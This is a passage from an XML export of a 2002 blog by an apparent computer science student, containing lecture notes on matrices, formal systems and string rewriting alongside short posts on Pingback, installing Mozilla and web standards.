&lt;p&gt;A &lt;dfn&gt;matrix&lt;/dfn&gt; us a rectangular array of numbers. The numbers in the array are caled elements.&lt;/p&gt;

&lt;h4&gt;Example:&lt;/h4&gt;

&lt;pre&gt;
      (columns)
     C1  C2  C3
    [2   1   5] R1  (rows)
A = [3   4   6] R2
&lt;/pre&gt;

&lt;p&gt;A[i, j] = the element in row i, column j e.g A[2, 3] = 6 in the above example.&lt;/p&gt;

&lt;p&gt;A &lt;dfn&gt;submatrix&lt;/dfn&gt; is a matrix obtained by delting some rows and/or columns from a matrix.&lt;/p&gt;

&lt;h4&gt;Terminology:&lt;/h4&gt;
&lt;dl&gt;
&lt;dt&gt;Square Matrix&lt;/dt&gt;
&lt;dd&gt;A matrix with the same number of rows and columns&lt;/dd&gt;
&lt;dt&gt;Identity Matrix&lt;/dt&gt;
&lt;dd&gt;&lt;p&gt;Square matrix with 1s on the diagonal (top-left to bottom-right) and 0s elsewhere, i.e:&lt;/p&gt;
&lt;pre&gt;
          { 1 if i == j
I[i, j] = { 0 if i != j
&lt;/pre&gt;
&lt;/dd&gt;
&lt;dt&gt;Row matrix&lt;/dt&gt;
&lt;dd&gt;One row, [a&lt;sub&gt;1&lt;/sub&gt; ... a&lt;sub&gt;m&lt;/sub&gt;]&lt;/dd&gt;
&lt;dt&gt;Column matrix:&lt;/dt&gt;
&lt;dd&gt;One column&lt;/dd&gt;
&lt;/dl&gt;

&lt;hr /&gt;

&lt;p&gt;We can use matrices to describe systems of equations:&lt;/p&gt;

&lt;pre&gt;
3x + 2y + z = 1                               [ 3   2   1 ]
x  - y  + z = 0   has matrix of coefficients  [ 1  -1   1 ]
2x + y  - z = 3                               [ 2   1  -1 ]
&lt;/pre&gt;

&lt;p&gt;This can be extended to create the &lt;dfn&gt;augmented matrix&lt;/dfn&gt; for the system, which adds an extra column showing the equation results:&lt;/p&gt;

&lt;pre&gt;
[ 3   2   1   1 ]
[ 1  -1   1   0 ]
[ 2   1  -1   3 ]
&lt;/pre&gt;

&lt;p&gt;&lt;dfn&gt;Elementary transformations&lt;/dfn&gt; are used to change a system of equations in to another simpler system with the same solution. These correspond to &lt;em&gt;elementary row operations&lt;/em&gt; on matrices.&lt;/p&gt;

&lt;p&gt;The &lt;dfn&gt;elementary row operations&lt;/dfn&gt; are things you can do to the augmented matrix that will not change the solution. They are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Interchange two rows (obviously has no effect)&lt;/li&gt;
&lt;li&gt;Multiply a row by a &lt;em&gt;non-zero&lt;/em&gt; constant&lt;/li&gt;
&lt;li&gt;Subtract a multiple of one row from another&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The third &lt;acronym title=&quot;Elementary Row Operation&quot;&gt;ELO&lt;/acronym&gt; will alter the goemetry of the system (as visualised in xyz space) but it will not change the solution of the system.&lt;/p&gt;

&lt;h4&gt;Notation&lt;/h4&gt;

&lt;p&gt;A =&amp;gt; B means A can be changed to B by one &lt;acronym title=&quot;Elementary Row Operation&quot;&gt;ELO&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;A =&amp;gt;* B means A can be changed to B by a sequence of &lt;acronym title=&quot;Elementary Row Operation&quot;&gt;ELO&lt;/acronym&gt;s.&lt;/p&gt;

&lt;p&gt;A =&amp;gt;* B is reversible, as each of the &lt;acronym title=&quot;Elementary Row Operation&quot;&gt;ELO&lt;/acronym&gt;s can be easily reversed.&lt;/p&gt;</field>
		<field name="created">2002-09-23 18:53:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">438</field>
		<field name="title">Blogging my lecture notes</field>
		<field name="slug">bloggingMyLectureNotes</field>
		<field name="body">&lt;p&gt;So what was &lt;a href=&quot;/archive/2002/09/23/#mathsForAppsLecture1&quot;&gt;all that&lt;/a&gt; about? University term started today, and with it comes my grand plan to blog my lecture notes. Don't worry, I will be restructuring this site in the near future to keep lecture notes off the front page so people who come here for web development stuff don't have to wade through the details of my Computer Science degree. Unfortunately I have limited internet access at the moment so it may be a week or two until I can make the necessary changes to my blog.&lt;/p&gt;</field>
		<field name="created">2002-09-23 18:55:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">439</field>
		<field name="title">How the RIAA was hacked</field>
		<field name="slug">howTheRiaaWasHacked</field>
		<field name="body">&lt;p&gt;The Register: &lt;a href=&quot;http://www.theregister.co.uk/content/6/27230.html&quot;&gt;Want to know how RIAA.org was hacked?&lt;/a&gt; They had an un-password-protected admin panel listed in their &lt;code&gt;robots.txt&lt;/code&gt; file. Muppets.&lt;/p&gt;</field>
		<field name="created">2002-09-23 19:02:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">440</field>
		<field name="title">Pingback 1.0</field>
		<field name="slug">pingback10</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1032794857&amp;amp;count=1&quot; title=&quot;Pingback 1.0&quot;&gt;published&lt;/a&gt; the &lt;a href=&quot;http://www.hixie.ch/specs/pingback/pingback-1.0&quot; title=&quot;Pingback 1.0 Specification&quot;&gt;specification for Pingback 1.0&lt;/a&gt;. In general the specification is an excellent document, but I'm not entirely happy with the following statement:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.hixie.ch/specs/pingback/pingback-1.0&quot;&gt;&lt;p&gt;
HTML and XHTML documents MAY include a &amp;lt;link&amp;gt; element in addition to an HTTP header, although this is discouraged.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Some Pingback clients (in particular bookmarklets, although to my knowledge none have been written yet) are expected to be unable to parse headers - which is the primary reason for including the link element method of auto discovery. I would therefore suggest that anyone wishing to pingback-enable their HTML or XHTML documents should include a Pingback link element in addition to the HTTP header.&lt;/p&gt;</field>
		<field name="created">2002-09-24 14:04:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">441</field>
		<field name="title">How to install Mozilla on Bath University PCs</field>
		<field name="slug">installingMozilla</field>
		<field name="body">&lt;p&gt;Since I'm using the University Library computers at the moment I'm having to reinstall Mozilla on a daily basis. Here's how I do it:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Download &lt;a href=&quot;http://ftp.mozilla.org/pub/mozilla/releases/mozilla1.2a/mozilla-win32-1.2a-installer.exe&quot;&gt;Mozilla 1.2 Alpha for Windows&lt;/a&gt; (11 MB), taking advantage of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s &quot;Run this program from its current location&quot; option to minimise the time spent using that browser&lt;/li&gt;
&lt;li&gt;In &lt;em&gt;Edit-&amp;gt;Preferences-&amp;gt;Advanced-&amp;gt;Proxies&lt;/em&gt; select &lt;em&gt;Automatic proxy configuration URL&lt;/em&gt;, enter &lt;code&gt;http://www.bath.ac.uk/proxy/netscape.config&lt;/code&gt; and hit the &quot;reload&quot; button (this gets Mozilla working with the Bath Uni proxy server)&lt;/li&gt;
&lt;li&gt;Install the excellent &lt;a href=&quot;http://orbit-m.cdn.gs/&quot;&gt;Orbit 3m skin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Install the &lt;a href=&quot;http://optimoz.mozdev.org/gestures/&quot;&gt;gesture recognition plugin&lt;/a&gt; from Optimoz&lt;/li&gt;
&lt;li&gt;Select Orbit 3m from the &lt;em&gt;View-&amp;gt;Apply Theme&lt;/em&gt; menu&lt;/li&gt;
&lt;li&gt;Restart Mozilla (to apply the skin change and enable gestures)&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Edit-&amp;gt;Preferences-&amp;gt;Advanced-&amp;gt;Mouse Gestures&lt;/em&gt; and set &quot;Make mouse gesture with&quot; to &quot;Right mouse button&quot; (that way gestures will not interfere with dragging over text to select it)&lt;/li&gt;
&lt;li&gt;In &lt;em&gt;Preferences-&amp;gt;Navigator-&amp;gt;Tabbed Browsing&lt;/em&gt;, check all of the options. This lets me load links in the background in a new tab just by middle-clicking on them.&lt;/li&gt;
&lt;li&gt;&lt;kbd&gt;Ctrl+B&lt;/kbd&gt; to bring up the bookmark manager, then &lt;em&gt;File-&amp;gt;New-&amp;gt;Bookmark&lt;/em&gt; to add the only bookmark I ever need: &lt;code&gt;http://www.google.com/search?q=%s&lt;/code&gt;. Once added, I right click the new bookmark, bring up the Properties dialog and set the Keyword to &quot;gg&quot;. I can then search for things on Google by typing &quot;gg search terms&quot; straight in to the Mozilla URL bar.&lt;/li&gt;
&lt;li&gt;Finally, &lt;em&gt;Preferences-&amp;gt;Advanced-&amp;gt;Scripts &amp;amp; Plugins&lt;/em&gt; and uncheck the &quot;Open unrequested windows&quot; option to kill popups&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The above usually takes about 5 minutes but is well worth the time spent if I'm planning to use the library computers for more than half an hour. There's probably a way of automating it all (I heard rumours that Hixie has a script to install the whole lot whenever he logs in) but I'm hoping to have a connection at home again within a couple of weeks.&lt;/p&gt;</field>
		<field name="created">2002-09-24 13:56:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">442</field>
		<field name="title">Bath University web guidelines</field>
		<field name="slug">bathUniversityGuidelines</field>
		<field name="body">&lt;p&gt;The Bath University &lt;a href=&quot;http://internal.bath.ac.uk/web/&quot;&gt;Web Standards &amp;amp; Publishing Guide&lt;/a&gt; makes interesting reading. They have &lt;a href=&quot;http://internal.bath.ac.uk/web/page-design.htm&quot; title=&quot;Design, layout and standards for web pages&quot;&gt;standardised&lt;/a&gt; on HTML 4.01 Transitional and &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; level 2, although the actual page that suggests those standards has an XHTML doctype and fails to validate. The University also &lt;a href=&quot;http://www.bath.ac.uk/web/accessibility/#levels&quot; title=&quot;Levels of Accessibility&quot;&gt;aims&lt;/a&gt; to support the W3C's Web Content Accessibility Guidelines, priority level 1.&lt;/p&gt;</field>
		<field name="created">2002-09-24 17:48:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">443</field>
		<field name="title">Deng - HTML rendering in Flash</field>
		<field name="slug">deng</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://claus.packts.net/&quot;&gt;DENG&lt;/a&gt; (via &lt;a href=&quot;http://www.webstandards.org/buzz/archive/2002_09.html#a000086&quot; title=&quot;The Web Standards Project&quot;&gt;WaSP&lt;/a&gt;) is &lt;q cite=&quot;http://webaccess.mozquito.com/&quot;&gt;a W3C compliant XHTML/CSS/XForms rendering engine written entirely in Flash MX Actionscript&lt;/q&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Updated 27th July 2006:&lt;/strong&gt; Link no longer points at a domain squatter.&lt;/p&gt;</field>
		<field name="created">2002-09-25 15:25:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">444</field>
		<field name="title">Pingback coverage</field>
		<field name="slug">pingbackCoverage</field>
		<field name="body">&lt;p&gt;The Pingback 1.0 specification is getting some serious attention. &lt;a href=&quot;http://diveintomark.org/archives/2002/09/23.html#now_heavily_medicated&quot; title=&quot;Now heavily medicated&quot;&gt;Mark Pilgrim&lt;/a&gt; and &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/09/24#When:8:14:24PM&quot; title=&quot;Form opinion&quot;&gt;Dave Winer&lt;/a&gt; have linked to it. Ben Trott (co-author of Moveable Type and creator of TrackBack, the system that inspired Pingback) has &lt;a href=&quot;http://www.stupidfool.org/archives/2002/09/000211.shtml&quot; title=&quot;Pingback&quot;&gt;objected&lt;/a&gt; to Hixie's &lt;a href=&quot;http://ln.hixie.ch/?start=1032794857&amp;amp;count=1&quot; title=&quot;Pingback 1.0&quot;&gt;suggestion&lt;/a&gt; that Pingback is more transparent than TrackBack, claiming that TrackBack could be made just as transparent by the right blog tools. Ben &lt;a href=&quot;http://www.stupidfool.org/archives/2002/09/000212.shtml&quot; title=&quot;More on PingBack and Transparency&quot;&gt;blogged&lt;/a&gt; some further thoughts which lead to the following comment by Phil Ringnalda:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.stupidfool.org/archives/2002/09/000212.shtml&quot;&gt;&lt;p&gt;I've avoided saying anything about PingBack until now, since I like and respect the people who've developed it, but it is *not* TrackBack. When you send a TrackBack ping, you are saying &quot;I responded to this, and I think that your readers would also like to read what I said.&quot; You are leaving a remote comment. When you send a PingBack ping, you are saying &quot;I linked to you&quot;, nothing more. It's a &quot;show referrers&quot; script that filters out non-weblog referrers, a way to avoid having to click your own links to be sure you send a referrer. It is *not* TrackBack.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is an interesting perspective, but I can't agree with it completely. Firstly, Pingbacks are meant to be sent by blogging tools. If you have blogged a link to someone else's entry you are linking to them for a purpose (which is almost certainly some form of comment on their entry) - this is why my Pingback implementation grabs an extract of their page from the text surrounding the link.&lt;/p&gt;

&lt;p&gt;michel v has some &lt;a href=&quot;http://tidakada.com/archives/p/1876/more/1&quot;&gt;further thoughts&lt;/a&gt; on the differences between Pingback and TrackBack.&lt;/p&gt;</field>
		<field name="created">2002-09-25 12:54:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">445</field>
		<field name="title">Dot.com contrasts</field>
		<field name="slug">dotComContrasts</field>
		<field name="body">&lt;p&gt;Tony Bowden &lt;a href=&quot;http://www.tmtm.com/insanity/2002/09/25.html#a299&quot;&gt;comments&lt;/a&gt; on &lt;a href=&quot;http://www.amazon.co.uk/exec/obidos/ASIN/0099418371/&quot;&gt;Boo Hoo&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tmtm.com/insanity/2002/09/25.html#a299&quot;&gt;&lt;p&gt;At the point of Boo's collapse, we'd built BlackStar to a turnover of $1m per month, with a total operating spend (excluding marketing) of less than $2m in the two years we'd been trading. Our product development costs (i.e the website, and all our fulfilment and customer service systems etc) had been less than $200k, whereas Boo had spent $250k solely on the feasibility study for theirs!&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-09-25 13:11:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">446</field>
		<field name="title">ESF</field>
		<field name="slug">esf</field>
		<field name="body">&lt;p&gt;RSS 3.0 &lt;a href=&quot;http://www.aaronsw.com/weblog/000574&quot; title=&quot;RSS 3.0&quot;&gt;was a joke&lt;/a&gt;. &lt;a href=&quot;http://www.aquarionics.com/nodes/view.php?name=esf&quot;&gt;&lt;acronym title=&quot;Epistula Syndication Format&quot;&gt;ESF&lt;/acronym&gt;&lt;/a&gt; is &lt;a href=&quot;http://www.aquarionics.com/index.php?id=740&quot; title=&quot;ESF&quot;&gt;serious&lt;/a&gt;, and is already getting a fair bit of attention from the blogging and syndication communities.&lt;/p&gt;</field>
		<field name="created">2002-09-25 13:19:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">447</field>
		<field name="title">Fluid thinking</field>
		<field name="slug">fluidThinking</field>
		<field name="body">&lt;p&gt;Peter-Paul Koch explains graceful degradation in &lt;a href=&quot;http://www.digital-web.com/columns/keepitsimple/keepitsimple_2002-09.shtml&quot;&gt;Fluid Thinking&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.digital-web.com/columns/keepitsimple/keepitsimple_2002-09.shtml&quot;&gt;&lt;p&gt;
Think fluid. The WWW isn't a fixed medium. It's unpredictable. It will do unexpected things to your site, and the best you can do is go with the flow.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-09-25 13:26:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">448</field>
		<field name="title">Formal systems</field>
		<field name="slug">formalSystems</field>
		<field name="body">&lt;h3&gt;Formal Systems&lt;/h3&gt;

&lt;p&gt;These notes cover the first lecture in Dr Dan Richardson's &lt;em&gt;Formal Systems, logic and semantics&lt;/em&gt; lecture. I missed the lecture so these notes are being made with the help of the course notes from Dr Richardon's &lt;a href=&quot;http://www.bath.ac.uk/~masdr/&quot;&gt;homepage&lt;/a&gt; (which  can be viewed using &lt;a href=&quot;http://www.ph.unimelb.edu.au/~jpc/dviview/&quot;&gt;DVI Viewer for Windows&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;In this course, a &lt;dfn&gt;Formal System&lt;/dfn&gt; is a set of possible configurations (or arrangements) of a system and a set of rules governing the transitions that can be made between these arrangements. Configurations can be represented by data structures, and will be referred to as set D. Rules will be referred to as set R. An example of a formal system is chess - the configuration is the arrangement of pieces on the board (and the information on who's turn it is) while the rules are the possible moves that can be made following the rules of the game. An alternative discussion of the definition of formal systems can be found &lt;a href=&quot;http://people.cs.uchicago.edu/~odonnell/Teacher/Lectures/Formal_Organization_of_Knowledge/Formal_system/&quot; title=&quot;Definition of formal system&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If X and Y are configurations within the set D, &lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;R&lt;/sub&gt; Y&lt;/span&gt; means that there is a rule in the set of rules R that will allow the transition from X to Y to be made in one step.&lt;/p&gt;

&lt;p&gt;Similarly, &lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;&lt;sup&gt;*&lt;/sup&gt;R&lt;/sub&gt; Y&lt;/span&gt; means that X can be transformed in to Y using a finite sequence of transitions defined by the rules in R.&lt;/p&gt;

&lt;p&gt;A &lt;dfn&gt;Derivation&lt;/dfn&gt; in the formal system (D, R) is a finite sequence of rules that can be applied to an object in D. Derivations of length 0 are allowed, so &lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;&lt;sup&gt;*&lt;/sup&gt;R&lt;/sub&gt; X&lt;/span&gt; is always true.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;R&lt;/sub&gt; Y&lt;/span&gt; must be decdable - it must be easy to determine if the transition is permitted by the rules. R is formal and must not be ambiguous - it must depend only on X and Y and not on any information outside those data structures.&lt;/p&gt;

&lt;p&gt;While &lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;R&lt;/sub&gt; Y&lt;/span&gt; is simple, &lt;span class=&quot;equation&quot;&gt;X =&amp;gt;&lt;sub&gt;&lt;sup&gt;*&lt;/sup&gt;R&lt;/sub&gt; Y&lt;/span&gt; can be very complex, and forms the core problem solving activity when dealing with formal systems.&lt;/p&gt;

&lt;h4&gt;Design principles of formal systems&lt;/h4&gt;

&lt;p&gt;A formal system's &lt;dfn&gt;specification&lt;/dfn&gt; is a statement defining what a formal system should do, for example &quot;the system should model the rules of chess&quot;. The following criteria are used to judge how well a formal system meets its specification:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;dfn&gt;Completeness&lt;/dfn&gt; - it must do everything the specification requires&lt;/li&gt;
&lt;li&gt;&lt;dfn&gt;Correctness&lt;/dfn&gt; - it must not do anything that the specification prohibits&lt;/li&gt;
&lt;li&gt;&lt;dfn&gt;Simplicity&lt;/dfn&gt; (also called the Occam's razor condition). This is discussed &lt;a href=&quot;http://www.wikipedia.com/wiki/Occams_razor&quot; title=&quot;Wikipedia: Occam&amp;apos;s Razor&quot;&gt;here&lt;/a&gt;, and is paraphrased as &lt;q cite=&quot;http://www.wikipedia.com/wiki/Occams_razor&quot;&gt;Simple explanations are preferred to complex ones&lt;/q&gt;&lt;/li&gt;
&lt;li&gt;&lt;dfn&gt;Naturalness&lt;/dfn&gt; - the system should be intuitive.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;Confluence and termination&lt;/h4&gt;

&lt;p&gt;A formal system is &lt;dfn&gt;terminating&lt;/dfn&gt; if it does not contain any infinite derivations, so no matter what choices are made the derivations will eventually stop. The best way of working out if a formal system is terminating is to check for possible loops in the set of rules.&lt;/p&gt;

&lt;p&gt;A formal system is &lt;dfn&gt;confluent&lt;/dfn&gt; if whenever &lt;span class=&quot;equation&quot;&gt;A =&amp;gt;&lt;sup&gt;*&lt;/sup&gt; B&lt;/span&gt; and &lt;span class=&quot;equation&quot;&gt;A =&amp;gt;&lt;sup&gt;*&lt;/sup&gt; C&lt;/span&gt; there exists D so that &lt;span class=&quot;equation&quot;&gt;B =&amp;gt;&lt;sup&gt;*&lt;/sup&gt; D&lt;/span&gt; and &lt;span class=&quot;equation&quot;&gt;C =&amp;gt;&lt;sup&gt;*&lt;/sup&gt; D&lt;/span&gt; - the computations, once separated, can always be brought back together again. A system is &lt;dfn&gt;locally confluent&lt;/dfn&gt; if the above is true but for &lt;span class=&quot;equation&quot;&gt;A =&amp;gt; B&lt;/span&gt; and &lt;span class=&quot;equation&quot;&gt;A =&amp;gt; C&lt;/span&gt; (i.e a single level decision can be reverted).&lt;/p&gt;</field>
		<field name="created">2002-09-25 14:07:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">449</field>
		<field name="title">String rewriting systems</field>
		<field name="slug">stringRewritingSystems</field>
		<field name="body">&lt;h3&gt;String Rewriting Systems&lt;/h3&gt;

&lt;p&gt;These notes are from the second lecture in Dr Richardson's Formal Systems course.&lt;/p&gt;

&lt;p&gt;Let Σ be a finite set of symbols. Σ&lt;sup&gt;*&lt;/sup&gt; is the set of &lt;em&gt;all&lt;/em&gt; finite length strings of symbols from Σ.&lt;/p&gt;
&lt;pre&gt;
Σ = {a, b}
bbaba ∈ Σ*
(0) ∈ Σ*     (0) is a zero-length-string
&lt;/pre&gt;

&lt;p&gt;A &lt;dfn&gt;Σ rewriting rule&lt;/dfn&gt; is an expression of the form α ~&amp;gt; β where α, β ∈ Σ&lt;sup&gt;*&lt;/sup&gt;&lt;/p&gt;

&lt;pre&gt;
Examples:
aabb ~&amp;gt; (0)
bba ~&amp;gt; ab
&lt;/pre&gt;

&lt;p&gt;A &lt;dfn&gt;Σ rewriting system&lt;/dfn&gt; is a finite set of Σ rewriting rules:&lt;/p&gt;

&lt;pre&gt;
    { α1 ~&amp;gt; β1
P = { ...
    { αn ~&amp;gt; βn
&lt;/pre&gt;

&lt;h4&gt;Definition:&lt;/h4&gt;

&lt;p&gt;For X, Y in Σ&lt;sup&gt;*&lt;/sup&gt;:&lt;/p&gt;

&lt;pre&gt;
X =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; Y
If
  X = ω&lt;sub&gt;1&lt;/sub&gt; α&lt;sub&gt;i&lt;/sub&gt; ω&lt;sub&gt;2&lt;/sub&gt;
Then
  Y = ω&lt;sub&gt;1&lt;/sub&gt; β&lt;sub&gt;i&lt;/sub&gt; ω&lt;sub&gt;2&lt;/sub&gt;
Where
  α&lt;sub&gt;i&lt;/sub&gt; ~&amp;gt; β&lt;sub&gt;i&lt;/sub&gt; ∈ P
And ω&lt;sub&gt;1&lt;/sub&gt;, ω&lt;sub&gt;2&lt;/sub&gt; ∈ Σ&lt;sup&gt;*&lt;/sup&gt;
&lt;/pre&gt;

&lt;h4&gt;Example:&lt;/h4&gt;

&lt;pre&gt;
                   { ba ~&amp;gt; ab
Σ = { a, b }   P = { bb ~&amp;gt; b
&lt;/pre&gt;
&lt;p&gt;The string &quot;babbaba&quot; has four possible transformations:&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;u&quot;&gt;ba&lt;/span&gt; &lt;span class=&quot;u&quot;&gt;bb&lt;/span&gt; a &lt;span class=&quot;u&quot;&gt;ba&lt;/span&gt;
    ---

bab&lt;span class=&quot;u&quot;&gt;ba&lt;/span&gt;ba =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; bababba
        =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; bababa
        =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; ababab
        =&amp;gt;&lt;sub&gt;P&lt;/sub&gt; aabab
&lt;/pre&gt;

&lt;p&gt;We will end up with &quot;aaab&quot;, as every application of the first rule moves the bs to the right, while the second rule eliminates them. This is a terminating formal system as it can not be infinitely derived. It is also confluent, as no matter what rule you apply you will eventually end up with the same string. Finally, it is locally confluent as any two paths from the same configuration can be brought back together when the final string is reached.&lt;/p&gt;

&lt;h3&gt;Example with Semantics: Symmetries of a Square&lt;/h3&gt;

&lt;p&gt;This example has semantics as it has relevance to the real world. A square has four corners, represented thus:&lt;/p&gt;

&lt;pre&gt;
1  2
4  3
&lt;/pre&gt;

&lt;p&gt;We define a set of symbols:&lt;/p&gt;

&lt;pre&gt;
Σ = { F, R }
&lt;/pre&gt;

&lt;p&gt;F and R are transformations that can be applied to the square - Flip and Rotate. When a square is flipped, the top right corner is swapped with the bottom left corner:&lt;/p&gt;

&lt;pre&gt;
1  2   F   1  4
4  3  ==&amp;gt;  2  3
&lt;/pre&gt;

&lt;p&gt;Rotations occur as a single 90 degree clockwise transformation:&lt;/p&gt;

&lt;pre&gt;
1  2   R   4  1
4  3  ==&amp;gt;  3  2
&lt;/pre&gt;

&lt;p&gt;A string in Σ&lt;sup&gt;*&lt;/sup&gt; is a sequance of operations, applied left-to-right. For example, RFRR means &quot;rotate, flip, rotate, rotate&quot;.&lt;/p&gt;

&lt;p&gt;The set of Σ rewriting rules is as follows:&lt;/p&gt;

&lt;pre&gt;
    { FF ~&amp;gt; (0)
P = { RRRR ~&amp;gt; (0)
    { FR ~&amp;gt; RRRF
&lt;/pre&gt;

&lt;p&gt;The first two rules are obvious. The third can be demonstrated by comparing the effect of the two strings. Now let's apply the rules to the string &quot;RFRFR&quot; in two different ways:&lt;/p&gt;

&lt;pre&gt;
         R &lt;span class=&quot;u&quot;&gt;FR&lt;/span&gt; &lt;span class=&quot;u&quot;&gt;FR&lt;/span&gt;
           /    \
          /      \
   &lt;span class=&quot;strike&quot;&gt;RRRR&lt;/span&gt; &lt;span class=&quot;strike&quot;&gt;FF&lt;/span&gt; R    RF &lt;span class=&quot;strike&quot;&gt;RRRR&lt;/span&gt; F
      |             |
      R            R &lt;span class=&quot;strike&quot;&gt;FF&lt;/span&gt;
                    |
                    R
&lt;/pre&gt;

&lt;p&gt;The two divergent branches come together at the end, showing the system to be locally confluent. We can also see that the formal system is terminating - the third rule moves Fs to the right where double flips / quadruple rotations will wipe each other out.&lt;/p&gt;

&lt;p&gt;So... every word ω ∈ Σ&lt;sup&gt;*&lt;/sup&gt; has a normal form ω =&lt;sup&gt;*&lt;/sup&gt;&amp;gt; R&lt;sup&gt;i&lt;/sup&gt;F&lt;sup&gt;j&lt;/sup&gt; where i = {0, 1, 2, 3} and j = {0, 1}&lt;/p&gt;

&lt;p&gt;We can safely claim that our system is terminating, confluent and locally confulent.&lt;/p&gt;

&lt;h4&gt;Completeness and Correctness&lt;/h4&gt;

&lt;p&gt;We will say that our system (Σ&lt;sup&gt;*&lt;/sup&gt;, P) is &lt;em&gt;correct&lt;/em&gt; with respect to this interpretation:&lt;/p&gt;

&lt;pre&gt;If X =&amp;gt;&lt;sup&gt;*&lt;/sup&gt;&lt;sub&gt;P&lt;/sub&gt;Y then X = Y as symmetry of square.&lt;/pre&gt;

&lt;p&gt;We will say that our system (Σ&lt;sup&gt;*&lt;/sup&gt;, P) is &lt;em&gt;complete&lt;/em&gt; with respect to this interpretation:&lt;/p&gt;

&lt;pre&gt;If X = Y as symmetry of square then X =&amp;gt;&lt;sup&gt;*&lt;/sup&gt;&lt;sub&gt;P&lt;/sub&gt;Y&lt;/pre&gt;

&lt;p&gt;Correctness follows from correctness of each rule in P.&lt;/p&gt;

&lt;p&gt;The above rules reduce any word to a normal form R&lt;sup&gt;i&lt;/sup&gt;F&lt;sup&gt;j&lt;/sup&gt; where i = {0, 1, 2, 3} and j = {0, 1}. If these rules are not &lt;em&gt;complete&lt;/em&gt;, two (or more) of these normal forms must represent the same symmetry. We could check if this is the case by writing out the 8 possible combinations and comparing them all (64 comparisons) but a better way to check is to look at the properties of the symmatry of a square:&lt;/p&gt;

&lt;p&gt;There are four possible places for the first corner to end up in after a transformation of a square:&lt;/p&gt;

&lt;pre&gt;
1  2    ?  ?
4  3    ?  ?
&lt;/pre&gt;

&lt;p&gt;After the first corner has been placed, there are only two possibilities for positions for the second corner (depending on whether or not the square has been flipped):&lt;/p&gt;

&lt;pre&gt;1  ?
?  *
&lt;/pre&gt;

&lt;p&gt;Once the second corner has been placed, the rules of symmetry mean that the remaining two corners must be placed in specific places. This gives us 2 * 4 = 8 possible configurations, which demonstrates that our formal system for representing the symmetries of a square is both correct and complete.&lt;/p&gt;</field>
		<field name="created">2002-09-25 15:20:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">450</field>
		<field name="title">More lecture notes</field>
		<field name="slug">moreLectureNotes</field>
		<field name="body">&lt;p&gt;As you can see, I've posted some more lecture notes. The second set uses a HTML entities to display greek letters, as listed on &lt;a href=&quot;http://www.w3.org/TR/REC-html40/sgml/entities.html&quot; title=&quot;Character entity references in HTML 4&quot;&gt;this page&lt;/a&gt; of the HTML 4.0 recommendation.&lt;/p&gt;

&lt;p&gt;I've been thinking about various ways of keeping my lecture notes off the front page and out of the way of people who come here for web development related content. My preferred idea at the moment is to replace the current category system (which is in desperate need of an overhaul anyway) with a system of hierarchical categories instead. Categories will be nested within each other - for example, the PHP category will be nested inside the Server-Side Development category. There will be three top-level categories: Web Development, Computer Science and Student Life. The front page of this site will carry only categories contained within Web Development, while the Computer Science and Student Life hierarchies will have separate index pages. The archive pages will contain content from all categories, so only the index pages (and syndication feeds) will serve different content.&lt;/p&gt;

&lt;p&gt;There are still a few things I need to iron out with this approach; some categories seem to fit in more than one parent category (PHP is both a programming language and an open source project for example) and having a single archive for all three topic trees could cause confusion for people following permalinks.&lt;/p&gt;</field>
		<field name="created">2002-09-25 15:39:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">451</field>
		<field name="title">Functional programming</field>
		<field name="slug">functionalProgramming</field>
